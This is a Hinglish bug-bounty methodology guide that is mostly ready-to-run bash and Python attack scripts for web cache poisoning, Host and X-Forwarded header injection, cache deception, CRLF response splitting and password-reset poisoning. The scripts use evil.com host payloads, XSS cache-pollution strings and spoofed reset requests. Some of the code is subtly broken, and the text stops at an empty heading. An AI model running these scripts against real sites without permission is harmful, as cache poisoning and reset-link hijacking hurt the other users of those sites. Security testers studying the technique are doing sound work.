# 🔥 Elite Cache Poisoning & HTTP Header Injection Attack Methodology

## 🎯 Overview
Cache poisoning aur HTTP header injection attacks advanced web application vulnerabilities hain jo caching mechanisms aur HTTP headers ko exploit karte hain. Yeh techniques $400-$1200+ tak ka bug dilwa sakti hain aur mass user impact kar sakti hain.

## 🛠️ Phase 1: Cache Poisoning Fundamentals

### Understanding Cache Poisoning Types

#### 1. Web Cache Poisoning
```bash
# Web cache poisoning occurs when malicious content is stored
# in cache and served to other users

# Key concepts:
# - Cache keys vs unkeyed headers
# - Cache buster parameters
# - Reflected headers in responses
# - Cache duration and TTL
```

#### 2. HTTP Header Injection
```bash
# Injecting malicious headers to manipulate application behavior
# Common targets:
# - Host header injection
# - X-Forwarded-For manipulation
# - X-Original-URL injection
# - X-Rewrite-URL injection
```

#### 3. Cache Deception
```bash
# Tricking cache to store sensitive content as static resources
# Techniques:
# - Path confusion
# - Extension manipulation
# - MIME type confusion
```

## 🔍 Phase 2: Advanced Cache Poisoning Detection

### Method 1: Automated Cache Poisoning Scanner
```bash
#!/bin/bash
# Advanced cache poisoning detection scanner
# Save as cache_poisoning_scanner.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./cache_poisoning_scanner.sh https://target.com"
    exit 1
fi

echo "🗄️ Starting Advanced Cache Poisoning Scanner for $TARGET"
mkdir -p cache_poisoning_results
cd cache_poisoning_results

# Function to test cache poisoning with different headers
test_cache_poisoning() {
    local target=$1
    local endpoint=${2:-"/"}
    echo "🧪 Testing cache poisoning on $target$endpoint"
    
    # Generate unique cache buster
    cache_buster="cb_$(date +%s)_$$"
    
    # Test different header injection techniques
    header_tests=(
        "X-Forwarded-Host: evil.com"
        "X-Forwarded-For: 127.0.0.1"
        "X-Original-URL: /admin"
        "X-Rewrite-URL: /admin"
        "X-Forwarded-Proto: https"
        "X-Forwarded-Port: 443"
        "X-Real-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Forwarded-Server: evil.com"
        "X-Host: evil.com"
        "Forwarded: host=evil.com"
        "Forwarded: proto=https;host=evil.com"
    )
    
    for header in "${header_tests[@]}"; do
        echo "🔍 Testing header: $header"
        
        # Send poisoning request
        poison_response=$(curl -s -X GET \
            "$target$endpoint?cachebuster=$cache_buster" \
            -H "$header" \
            -H "User-Agent: CachePoisoner" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}|TIME:%{time_total}")
        
        # Parse response
        poison_http_code=$(echo "$poison_response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        poison_size=$(echo "$poison_response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        # Wait for cache to be populated
        sleep 2
        
        # Send normal request to check if cache is poisoned
        normal_response=$(curl -s -X GET \
            "$target$endpoint?cachebuster=$cache_buster" \
            -H "User-Agent: CacheChecker" \
            -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        
        normal_http_code=$(echo "$normal_response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        normal_size=$(echo "$normal_response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        # Check if cache was poisoned
        if [[ "$poison_http_code" == "200" && "$normal_http_code" == "200" ]]; then
            # Save both responses for comparison
            curl -s "$target$endpoint?cachebuster=$cache_buster" -H "$header" > "poison_response_$cache_buster.txt"
            sleep 1
            curl -s "$target$endpoint?cachebuster=$cache_buster" > "normal_response_$cache_buster.txt"
            
            # Check if responses contain injected content
            if grep -q "evil.com\|127.0.0.1\|admin" "normal_response_$cache_buster.txt"; then
                echo "✅ Cache poisoning successful with: $header"
                echo "$target$endpoint|$header|$cache_buster|$(date)" >> cache_poisoning_found.txt
                
                # Detailed analysis
                echo "🔍 Poisoned content found:"
                grep -n "evil.com\|127.0.0.1\|admin" "normal_response_$cache_buster.txt" | head -5
            fi
        fi
        
        sleep 1
    done
}

# Function to test Host header injection
test_host_header_injection() {
    local target=$1
    echo "🏠 Testing Host header injection for $target"
    
    # Extract hostname from target
    hostname=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1)
    
    # Host header injection payloads
    host_payloads=(
        "evil.com"
        "127.0.0.1"
        "localhost"
        "admin.${hostname}"
        "internal.${hostname}"
        "dev.${hostname}"
        "staging.${hostname}"
        "test.${hostname}"
        "${hostname}.evil.com"
        "evil.com:${hostname}"
        "${hostname}@evil.com"
        "evil.com#${hostname}"
    )
    
    for host_payload in "${host_payloads[@]}"; do
        echo "🔍 Testing Host header: $host_payload"
        
        # Test different endpoints
        test_endpoints=("/" "/login" "/admin" "/api" "/reset-password" "/forgot-password")
        
        for endpoint in "${test_endpoints[@]}"; do
            response=$(curl -s -X GET \
                "$target$endpoint" \
                -H "Host: $host_payload" \
                -H "User-Agent: HostInjectionTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            # Save response for analysis
            curl -s "$target$endpoint" -H "Host: $host_payload" > "host_injection_${endpoint//\//_}_${host_payload//[^a-zA-Z0-9]/_}.txt"
            
            # Check if injected host appears in response
            if grep -q "$host_payload" "host_injection_${endpoint//\//_}_${host_payload//[^a-zA-Z0-9]/_}.txt"; then
                echo "✅ Host header injection found: $target$endpoint with Host: $host_payload"
                echo "$target$endpoint|Host: $host_payload|$http_code|$(date)" >> host_injection_found.txt
                
                # Check for password reset links or sensitive URLs
                if grep -q "reset\|forgot\|verify\|confirm" "host_injection_${endpoint//\//_}_${host_payload//[^a-zA-Z0-9]/_}.txt"; then
                    echo "🚨 Critical: Password reset link manipulation possible!"
                    echo "$target$endpoint|Host: $host_payload|PASSWORD_RESET|$(date)" >> critical_host_injection.txt
                fi
            fi
        done
        
        sleep 0.5
    done
}

# Function to test X-Forwarded headers
test_forwarded_headers() {
    local target=$1
    echo "↗️ Testing X-Forwarded headers for $target"
    
    # X-Forwarded header combinations
    forwarded_tests=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Forwarded-For: 10.0.0.1"
        "X-Forwarded-For: 192.168.1.1"
        "X-Forwarded-For: 172.16.0.1"
        "X-Forwarded-Host: evil.com"
        "X-Forwarded-Proto: https"
        "X-Forwarded-Port: 443"
        "X-Forwarded-Server: evil.com"
        "X-Real-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Cluster-Client-IP: 127.0.0.1"
        "X-Original-URL: /admin"
        "X-Rewrite-URL: /admin"
    )
    
    for header in "${forwarded_tests[@]}"; do
        echo "🔍 Testing: $header"
        
        # Test on different endpoints
        endpoints=("/" "/api/user" "/profile" "/admin" "/login")
        
        for endpoint in "${endpoints[@]}"; do
            response=$(curl -s -X GET \
                "$target$endpoint" \
                -H "$header" \
                -H "User-Agent: ForwardedHeaderTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            
            # Save response
            curl -s "$target$endpoint" -H "$header" > "forwarded_${endpoint//\//_}_${header//[^a-zA-Z0-9]/_}.txt"
            
            # Check for header reflection or behavior change
            header_value=$(echo "$header" | cut -d' ' -f2)
            if grep -q "$header_value" "forwarded_${endpoint//\//_}_${header//[^a-zA-Z0-9]/_}.txt"; then
                echo "✅ Header reflection found: $target$endpoint with $header"
                echo "$target$endpoint|$header|REFLECTED|$(date)" >> forwarded_injection_found.txt
            fi
            
            # Check for admin access or privilege escalation
            if [[ "$endpoint" == "/admin" && "$http_code" == "200" ]]; then
                echo "🚨 Potential admin access via header injection!"
                echo "$target$endpoint|$header|ADMIN_ACCESS|$(date)" >> critical_forwarded_injection.txt
            fi
        done
        
        sleep 0.3
    done
}

# Run all cache poisoning tests
test_cache_poisoning "$TARGET"
test_host_header_injection "$TARGET"
test_forwarded_headers "$TARGET"

echo "✅ Cache poisoning and header injection testing completed!"
cd ..
```

### Method 2: Advanced Cache Deception Testing
```bash
# Cache deception attack testing
cache_deception_tester() {
    local target=$1
    echo "🎭 Testing cache deception attacks for $target"
    
    mkdir -p cache_deception_tests
    cd cache_deception_tests
    
    # Test cache deception with path confusion
    test_path_confusion() {
        echo "🛤️ Testing path confusion cache deception..."
        
        # Sensitive endpoints that might be cached incorrectly
        sensitive_endpoints=(
            "/api/user/profile"
            "/api/admin/users"
            "/api/account/details"
            "/api/private/documents"
            "/admin/dashboard"
            "/user/settings"
            "/profile/edit"
        )
        
        # Static file extensions that are typically cached
        static_extensions=(
            ".css"
            ".js"
            ".png"
            ".jpg"
            ".gif"
            ".ico"
            ".svg"
            ".woff"
            ".ttf"
            ".pdf"
            ".txt"
        )
        
        for endpoint in "${sensitive_endpoints[@]}"; do
            for extension in "${static_extensions[@]}"; do
                # Create deception URL
                deception_url="$target$endpoint$extension"
                
                echo "🔍 Testing: $deception_url"
                
                # Send request with static file extension
                response=$(curl -s -X GET \
                    "$deception_url" \
                    -H "User-Agent: CacheDeceptionTester" \
                    -w "HTTPCODE:%{http_code}|SIZE:%{size_download}|CONTENT_TYPE:%{content_type}")
                
                http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
                size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                content_type=$(echo "$response" | grep -o "CONTENT_TYPE:[^|]*" | cut -d: -f2)
                
                # Save response for analysis
                curl -s "$deception_url" > "deception_${endpoint//\//_}${extension//\./_}.txt"
                
                # Check if sensitive data is returned with static content type
                if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                    # Look for sensitive data patterns
                    if grep -q "password\|email\|token\|secret\|api_key\|user_id\|admin" "deception_${endpoint//\//_}${extension//\./_}.txt"; then
                        echo "✅ Cache deception successful: $deception_url"
                        echo "🚨 Sensitive data cached as static file!"
                        echo "$deception_url|$http_code|$content_type|$(date)" >> cache_deception_found.txt
                        
                        # Test if it's actually cached by sending another request
                        sleep 1
                        second_response=$(curl -s "$deception_url" -H "User-Agent: CacheVerifier")
                        if [[ "$second_response" == "$(cat deception_${endpoint//\//_}${extension//\./_}.txt)" ]]; then
                            echo "🔥 Confirmed: Content is cached!"
                            echo "$deception_url|CONFIRMED_CACHED|$(date)" >> confirmed_cache_deception.txt
                        fi
                    fi
                fi
                
                sleep 0.2
            done
        done
    }
    
    # Test cache deception with parameter pollution
    test_parameter_pollution() {
        echo "🔀 Testing parameter pollution cache deception..."
        
        # Parameter pollution techniques
        pollution_patterns=(
            "?file=sensitive.pdf&file=static.css"
            "?path=/admin&path=/static/style.css"
            "?url=/api/users&url=/images/logo.png"
            "?redirect=/admin&redirect=/static/app.js"
            "?page=admin&page=static"
        )
        
        for pattern in "${pollution_patterns[@]}"; do
            test_url="$target$pattern"
            echo "🔍 Testing pollution: $test_url"
            
            response=$(curl -s -X GET \
                "$test_url" \
                -H "User-Agent: ParameterPollutionTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                # Save and analyze response
                curl -s "$test_url" > "pollution_${pattern//[^a-zA-Z0-9]/_}.txt"
                
                # Check for admin content or sensitive data
                if grep -q "admin\|dashboard\|users\|sensitive\|private" "pollution_${pattern//[^a-zA-Z0-9]/_}.txt"; then
                    echo "✅ Parameter pollution cache deception: $test_url"
                    echo "$test_url|$http_code|$size|$(date)" >> parameter_pollution_found.txt
                fi
            fi
            
            sleep 0.3
        done
    }
    
    # Run cache deception tests
    test_path_confusion
    test_parameter_pollution
    
    cd ..
}

# Function to test HTTP response splitting
test_http_response_splitting() {
    local target=$1
    echo "✂️ Testing HTTP response splitting for $target"
    
    mkdir -p response_splitting_tests
    cd response_splitting_tests
    
    # Response splitting payloads
    splitting_payloads=(
        "test%0d%0aSet-Cookie:%20admin=true"
        "test%0d%0aLocation:%20http://evil.com"
        "test%0a%0d%0a%0d<script>alert('XSS')</script>"
        "test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('Injected')</script>"
        "test\r\nSet-Cookie: session=admin\r\n\r\n"
        "test\r\nLocation: http://evil.com\r\n\r\n"
    )
    
    # Test on different parameters
    test_parameters=("redirect" "url" "return" "callback" "next" "continue" "goto" "target")
    
    for param in "${test_parameters[@]}"; do
        for payload in "${splitting_payloads[@]}"; do
            test_url="$target/?$param=$payload"
            echo "🔍 Testing response splitting: $param=$payload"
            
            # Send request and capture full response including headers
            curl -s -i "$test_url" -H "User-Agent: ResponseSplittingTester" > "splitting_${param}_$(date +%s).txt"
            
            # Check for injected headers in response
            if grep -q "Set-Cookie.*admin\|Location.*evil.com\|<script>" "splitting_${param}_$(date +%s).txt"; then
                echo "✅ HTTP response splitting found: $test_url"
                echo "$test_url|$param|$payload|$(date)" >> response_splitting_found.txt
            fi
            
            sleep 0.5
        done
    done
    
    cd ..
}

# Function to test cache key confusion
test_cache_key_confusion() {
    local target=$1
    echo "🔑 Testing cache key confusion for $target"
    
    mkdir -p cache_key_tests
    cd cache_key_tests
    
    # Test different cache key manipulation techniques
    cache_key_tests=(
        # Method override
        "POST /?_method=GET"
        "GET /?_method=POST"
        
        # HTTP version confusion
        "GET / HTTP/1.0"
        "GET / HTTP/2.0"
        
        # Case sensitivity
        "get /"
        "Get /"
        "GET /"
        
        # Unicode normalization
        "GET /üser"
        "GET /user"
        
        # Double encoding
        "GET /%252Fadmin"  # Double URL encoded /admin
        "GET /%2E%2E%2Fadmin"  # Double encoded ../admin
    )
    
    for test_case in "${cache_key_tests[@]}"; do
        echo "🔍 Testing cache key: $test_case"
        
        # Extract method and path
        method=$(echo "$test_case" | cut -d' ' -f1)
        path=$(echo "$test_case" | cut -d' ' -f2)
        
        # Send request
        if [[ "$method" == "POST" ]]; then
            response=$(curl -s -X POST \
                "$target$path" \
                -H "User-Agent: CacheKeyTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        else
            response=$(curl -s -X GET \
                "$target$path" \
                -H "User-Agent: CacheKeyTester" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
        fi
        
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
        
        if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
            echo "✅ Cache key confusion possible: $test_case"
            echo "$target|$test_case|$http_code|$size|$(date)" >> cache_key_confusion.txt
        fi
        
        sleep 0.3
    done
    
    cd ..
}

# Run all cache poisoning tests
test_cache_poisoning "$TARGET"
cache_deception_tester "$TARGET"
test_http_response_splitting "$TARGET"
test_cache_key_confusion "$TARGET"

echo "✅ Cache poisoning and header injection testing completed!"

# Summary of findings
echo "📊 Summary of findings:"
if [[ -f cache_poisoning_found.txt ]]; then
    echo "🗄️ Cache poisoning vulnerabilities: $(wc -l < cache_poisoning_found.txt)"
fi
if [[ -f host_injection_found.txt ]]; then
    echo "🏠 Host header injection vulnerabilities: $(wc -l < host_injection_found.txt)"
fi
if [[ -f response_splitting_found.txt ]]; then
    echo "✂️ HTTP response splitting vulnerabilities: $(wc -l < response_splitting_found.txt)"
fi

cd ..
```

### Method 3: Advanced Cache Manipulation Techniques
```bash
# Advanced cache manipulation and bypass techniques
advanced_cache_manipulation() {
    local target=$1
    echo "🎯 Advanced cache manipulation testing for $target"
    
    mkdir -p advanced_cache_tests
    cd advanced_cache_tests
    
    # Test 1: Cache bypass techniques
    test_cache_bypass() {
        echo "🚫 Testing cache bypass techniques..."
        
        # Cache bypass headers
        bypass_headers=(
            "Cache-Control: no-cache"
            "Cache-Control: no-store"
            "Cache-Control: must-revalidate"
            "Pragma: no-cache"
            "If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT"
            "If-None-Match: \"12345\""
            "X-Cache-Bypass: true"
            "X-No-Cache: true"
            "X-Forwarded-Proto: http"  # Force HTTP on HTTPS sites
        )
        
        for header in "${bypass_headers[@]}"; do
            echo "🔍 Testing bypass header: $header"
            
            # Test on cacheable endpoints
            cacheable_endpoints=("/static/app.js" "/css/style.css" "/images/logo.png" "/api/public/data")
            
            for endpoint in "${cacheable_endpoints[@]}"; do
                # First request without bypass header
                normal_response=$(curl -s "$target$endpoint" -w "TIME:%{time_total}|SIZE:%{size_download}")
                normal_time=$(echo "$normal_response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
                normal_size=$(echo "$normal_response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                # Second request with bypass header
                bypass_response=$(curl -s "$target$endpoint" -H "$header" -w "TIME:%{time_total}|SIZE:%{size_download}")
                bypass_time=$(echo "$bypass_response" | grep -o "TIME:[0-9.]*" | cut -d: -f2)
                bypass_size=$(echo "$bypass_response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
                
                # Compare timing (cache bypass should be slower)
                if command -v bc >/dev/null 2>&1; then
                    time_diff=$(echo "$bypass_time - $normal_time" | bc)
                    if (( $(echo "$time_diff > 0.1" | bc -l) )); then
                        echo "✅ Cache bypass detected: $target$endpoint with $header"
                        echo "⏱️ Time difference: ${time_diff}s"
                        echo "$target$endpoint|$header|$time_diff|$(date)" >> cache_bypass_found.txt
                    fi
                fi
            done
            
            sleep 0.5
        done
    }
    
    # Test 2: Cache pollution
    test_cache_pollution() {
        echo "☣️ Testing cache pollution..."
        
        # Cache pollution payloads
        pollution_payloads=(
            "?utm_source=<script>alert('XSS')</script>"
            "?ref=<img src=x onerror=alert('XSS')>"
            "?campaign=javascript:alert('XSS')"
            "?tracking=<svg onload=alert('XSS')>"
            "?source=data:text/html,<script>alert('XSS')</script>"
        )
        
        for payload in "${pollution_payloads[@]}"; do
            pollution_url="$target$payload"
            echo "🔍 Testing pollution: $pollution_url"
            
            # Send pollution request
            curl -s "$pollution_url" -H "User-Agent: CachePollutionTester" > "pollution_response_$(date +%s).txt"
            
            # Wait for cache
            sleep 2
            
            # Send normal request to check if cache is polluted
            normal_response=$(curl -s "$target" -H "User-Agent: CacheChecker")
            echo "$normal_response" > "normal_after_pollution_$(date +%s).txt"
            
            # Check if XSS payload is in normal response
            if echo "$normal_response" | grep -q "<script>\|<img\|<svg\|javascript:\|data:"; then
                echo "✅ Cache pollution successful: $pollution_url"
                echo "$pollution_url|POLLUTION_SUCCESS|$(date)" >> cache_pollution_found.txt
            fi
            
            sleep 1
        done
    }
    
    # Test 3: Cache timing attacks
    test_cache_timing() {
        echo "⏱️ Testing cache timing attacks..."
        
        # Test if we can determine cache status through timing
        test_endpoints=("/" "/api/public" "/static/app.js" "/css/main.css")
        
        for endpoint in "${test_endpoints[@]}"; do
            echo "🔍 Testing timing on: $target$endpoint"
            
            # Collect timing data
            times=()
            for i in {1..10}; do
                start_time=$(date +%s%N)
                curl -s "$target$endpoint" > /dev/null
                end_time=$(date +%s%N)
                duration=$(((end_time - start_time) / 1000000))  # Convert to milliseconds
                times+=($duration)
                echo "Request $i: ${duration}ms"
                sleep 0.1
            done
            
            # Calculate average and check for cache patterns
            total=0
            for time in "${times[@]}"; do
                total=$((total + time))
            done
            average=$((total / ${#times[@]}))
            
            echo "📊 Average response time: ${average}ms"
            
            # Check for cache hit patterns (first request slow, subsequent fast)
            first_time=${times[0]}
            last_time=${times[-1]}
            
            if [[ $first_time -gt $((last_time * 2)) ]]; then
                echo "✅ Cache timing pattern detected on $target$endpoint"
                echo "🔥 First request: ${first_time}ms, Last request: ${last_time}ms"
                echo "$target$endpoint|TIMING_PATTERN|$first_time|$last_time|$(date)" >> cache_timing_patterns.txt
            fi
        done
    }
    
    # Run all cache deception tests
    test_path_confusion
    test_cache_pollution
    test_cache_timing
    
    cd ..
}

# Function to test advanced header injection combinations
test_advanced_header_combinations() {
    local target=$1
    echo "🔗 Testing advanced header injection combinations for $target"
    
    mkdir -p header_combination_tests
    cd header_combination_tests
    
    # Test multiple header combinations
    header_combinations=(
        # Host + X-Forwarded-Host
        "Host: evil.com|X-Forwarded-Host: evil.com"
        
        # Multiple forwarded headers
        "X-Forwarded-For: 127.0.0.1|X-Real-IP: 127.0.0.1|X-Client-IP: 127.0.0.1"
        
        # Protocol + Host manipulation
        "X-Forwarded-Proto: https|Host: evil.com|X-Forwarded-Port: 443"
        
        # Original URL + Host
        "X-Original-URL: /admin|Host: evil.com"
        
        # Rewrite URL + Forwarded Host
        "X-Rewrite-URL: /admin|X-Forwarded-Host: evil.com"
        
        # Multiple Host headers (HTTP/1.1 allows this)
        "Host: legitimate.com|Host: evil.com"
        
        # Case variations
        "host: evil.com|HOST: evil.com"
        
        # Unicode and encoding
        "Host: evil.com|X-Forwarded-Host: evi%6c.com"
    )
    
    for combination in "${header_combinations[@]}"; do
        echo "🔍 Testing header combination: $combination"
        
        # Split headers
        IFS='|' read -ra headers <<< "$combination"
        
        # Build curl command with multiple headers
        curl_headers=""
        for header in "${headers[@]}"; do
            curl_headers="$curl_headers -H \"$header\""
        done
        
        # Test on different endpoints
        test_endpoints=("/" "/login" "/admin" "/api/user" "/reset-password")
        
        for endpoint in "${test_endpoints[@]}"; do
            # Execute curl with multiple headers
            eval "curl -s '$target$endpoint' $curl_headers -H 'User-Agent: HeaderCombinationTester'" > "combo_${endpoint//\//_}_$(date +%s).txt"
            
            # Check for successful injection
            if grep -q "evil.com\|127.0.0.1\|admin" "combo_${endpoint//\//_}_$(date +%s).txt"; then
                echo "✅ Header combination injection: $target$endpoint"
                echo "$target$endpoint|$combination|$(date)" >> header_combination_found.txt
                
                # Check for critical impacts
                if [[ "$endpoint" == "/reset-password" ]] && grep -q "evil.com" "combo_${endpoint//\//_}_$(date +%s).txt"; then
                    echo "🚨 Critical: Password reset manipulation possible!"
                    echo "$target$endpoint|$combination|PASSWORD_RESET|$(date)" >> critical_header_injection.txt
                fi
            fi
        done
        
        sleep 0.5
    done
    
    cd ..
}

# Main execution
echo "🚀 Starting comprehensive cache poisoning and header injection testing..."

# Run all tests
test_cache_poisoning "$TARGET"
cache_deception_tester "$TARGET"
test_http_response_splitting "$TARGET"
test_advanced_header_combinations "$TARGET"

echo "✅ All cache poisoning and header injection tests completed!"

# Generate summary report
echo "📋 Generating summary report..."
cat > cache_poisoning_summary.txt << EOF
# Cache Poisoning & Header Injection Test Summary
Target: $TARGET
Date: $(date)

## Findings Summary:
EOF

if [[ -f cache_poisoning_results/cache_poisoning_found.txt ]]; then
    echo "- Cache Poisoning: $(wc -l < cache_poisoning_results/cache_poisoning_found.txt) vulnerabilities found" >> cache_poisoning_summary.txt
fi

if [[ -f cache_poisoning_results/host_injection_found.txt ]]; then
    echo "- Host Header Injection: $(wc -l < cache_poisoning_results/host_injection_found.txt) vulnerabilities found" >> cache_poisoning_summary.txt
fi

if [[ -f cache_deception_tests/cache_deception_found.txt ]]; then
    echo "- Cache Deception: $(wc -l < cache_deception_tests/cache_deception_found.txt) vulnerabilities found" >> cache_poisoning_summary.txt
fi

if [[ -f response_splitting_tests/response_splitting_found.txt ]]; then
    echo "- HTTP Response Splitting: $(wc -l < response_splitting_tests/response_splitting_found.txt) vulnerabilities found" >> cache_poisoning_summary.txt
fi

echo "📄 Summary report saved to cache_poisoning_summary.txt"
```

## 🎯 Phase 3: Real-World Exploitation Scenarios

### Scenario 1: Password Reset Poisoning
```bash
# Password reset cache poisoning exploitation
password_reset_poisoning() {
    local target=$1
    echo "🔐 Testing password reset poisoning for $target"
    
    # Test password reset endpoints
    reset_endpoints=(
        "/forgot-password"
        "/reset-password"
        "/password-reset"
        "/api/forgot-password"
        "/api/reset-password"
        "/auth/forgot-password"
        "/user/forgot-password"
    )
    
    for endpoint in "${reset_endpoints[@]}"; do
        echo "🔍 Testing: $target$endpoint"
        
        # Test Host header injection on password reset
        response=$(curl -s -X POST \
            "$target$endpoint" \
            -H "Host: evil.com" \
            -H "Content-Type: application/json" \
            -d '{"email": "test@victim.com"}' \
            -w "HTTPCODE:%{http_code}")
        
        http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
        
        if [[ "$http_code" == "200" ]]; then
            # Check if evil.com appears in response
            curl -s -X POST "$target$endpoint" -H "Host: evil.com" -H "Content-Type: application/json" -d '{"email": "test@victim.com"}' > "reset_response_$(date +%s).txt"
            
            if grep -q "evil.com" "reset_response_$(date +%s).txt"; then
                echo "✅ Password reset poisoning successful!"
                echo "🚨 Reset links will point to evil.com!"
                echo "$target$endpoint|PASSWORD_RESET_POISONING|$(date)" >> critical_findings.txt
            fi
        fi
        
        sleep 1
    done
}

# Usage
password_reset_poisoning "$TARGET"
```

### Scenario 2: API Cache Poisoning
```bash
# API cache poisoning for data manipulation
api_cache_poisoning() {
    local target=$1
    echo "🔌 Testing API cache poisoning for $target"
    
    # Common API endpoints
    api_endpoints=(
        "/api/user/profile"
        "/api/public/config"
        "/api/settings"
        "/api/data"
        "/api/content"
        "/api/news"
        "/api/products"
    )
    
    for endpoint in "${api_endpoints[@]}"; do
        echo "🔍 Testing API cache poisoning: $target$endpoint"
        
        # Test X-Forwarded-Host injection
        poison_response=$(curl -s -X GET \
            "$target$endpoint" \
            -H "X-Forwarded-Host: evil.com" \
            -H "User-Agent: APICachePoisoner")
        
        # Wait for cache
        sleep 3
        
        # Check if cache is poisoned
        normal_response=$(curl -s "$target$endpoint" -H "User-Agent: APICacheChecker")
        
        if echo "$normal_response" | grep -q "evil.com"; then
            echo "✅ API cache poisoning successful: $target$endpoint"
            echo "$target$endpoint|API_CACHE_POISONING|$(date)" >> api_cache_poisoning.txt
            
            # Save poisoned response
            echo "$normal_response" > "poisoned_api_$(basename $endpoint)_$(date +%s).json"
        fi
        
        sleep 1
    done
}

# Usage
api_cache_poisoning "$TARGET"
```

## 🔧 Phase 4: Automated Testing Tools

### Custom Cache Poisoning Tool
```bash
#!/bin/bash
# Custom automated cache poisoning tool
# Save as auto_cache_poison.sh

create_custom_cache_tool() {
    cat > cache_poison_tool.py << 'EOF'
#!/usr/bin/env python3
import requests
import time
import sys
import threading
from urllib.parse import urlparse

class CachePoisoningTester:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.findings = []
        
    def test_header_injection(self, endpoint, header_name, header_value):
        """Test header injection for cache poisoning"""
        try:
            # Send poisoning request
            poison_response = self.session.get(
                f"{self.target}{endpoint}",
                headers={
                    header_name: header_value,
                    'User-Agent': 'CachePoisoningTester'
                }
            )
            
            # Wait for cache
            time.sleep(2)
            
            # Send normal request
            normal_response = self.session.get(
                f"{self.target}{endpoint}",
                headers={'User-Agent': 'CacheChecker'}
            )
            
            # Check if cache is poisoned
            if header_value in normal_response.text:
                finding = {
                    'type': 'Cache Poisoning',
                    'endpoint': endpoint,
                    'header': f"{header_name}: {header_value}",
                    'status_code': normal_response.status_code,
                    'evidence': header_value in normal_response.text
                }
                self.findings.append(finding)
                print(f"✅ Cache poisoning found: {endpoint} with {header_name}: {header_value}")
                return True
                
        except Exception as e:
            print(f"❌ Error testing {endpoint}: {e}")
            
        return False
    
    def test_all_headers(self):
        """Test all header injection techniques"""
        headers_to_test = {
            'X-Forwarded-Host': 'evil.com',
            'X-Forwarded-For': '127.0.0.1',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin',
            'Host': 'evil.com',
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Port': '443'
        }
        
        endpoints_to_test = [
            '/',
            '/api/config',
            '/api/user',
            '/static/app.js',
            '/css/style.css'
        ]
        
        for endpoint in endpoints_to_test:
            for header_name, header_value in headers_to_test.items():
                self.test_header_injection(endpoint, header_name, header_value)
                time.sleep(0.5)
    
    def generate_report(self):
        """Generate findings report"""
        if self.findings:
            print(f"\n📊 Found {len(self.findings)} cache poisoning vulnerabilities:")
            for finding in self.findings:
                print(f"- {finding['endpoint']} with {finding['header']}")
        else:
            print("\nℹ️ No cache poisoning vulnerabilities detected")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 cache_poison_tool.py https://target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    tester = CachePoisoningTester(target)
    tester.test_all_headers()
    tester.generate_report()
EOF

    chmod +x cache_poison_tool.py
    echo "✅ Custom cache poisoning tool created: cache_poison_tool.py"
}

# Create the tool
create_custom_cache_tool

echo "🎯 Usage: python3 cache_poison_tool.py https://target.com"
```

## 💡 Elite Pro Tips for Cache Poisoning

### Advanced Techniques Elite Hackers Use:

#### 1. Cache Key Normalization Bypass
```bash
# Test different URL encodings that might bypass cache key normalization
test_cache_key_bypass() {
    local target=$1
    
    # Different encoding techniques
    encodings=(
        "/admin"                    # Normal
        "/%61dmin"                  # URL encoded 'a'
        "/admin%00"                 # Null byte
        "/admin%20"                 # Space
        "/admin%2e"                 # URL encoded '.'
        "/admin/"                   # Trailing slash
        "/admin//"                  # Double slash
        "/./admin"                  # Current directory
        "/../admin"                 # Parent directory
        "/admin%3f"                 # URL encoded '?'
        "/admin%23"                 # URL encoded '#'
    )
    
    for encoding in "${encodings[@]}"; do
        echo "🔍 Testing encoding: $encoding"
        curl -s "$target$encoding" -H "X-Forwarded-Host: evil.com" > "encoding_test_$(echo $encoding | tr '/' '_').txt"
        
        # Check if evil.com appears in response
        if grep -q "evil.com" "encoding_test_$(echo $encoding | tr '/' '_').txt"; then
            echo "✅ Cache key bypass with encoding: $encoding"
        fi
    done
}
```

#### 2. HTTP/2 Cache Poisoning
```bash
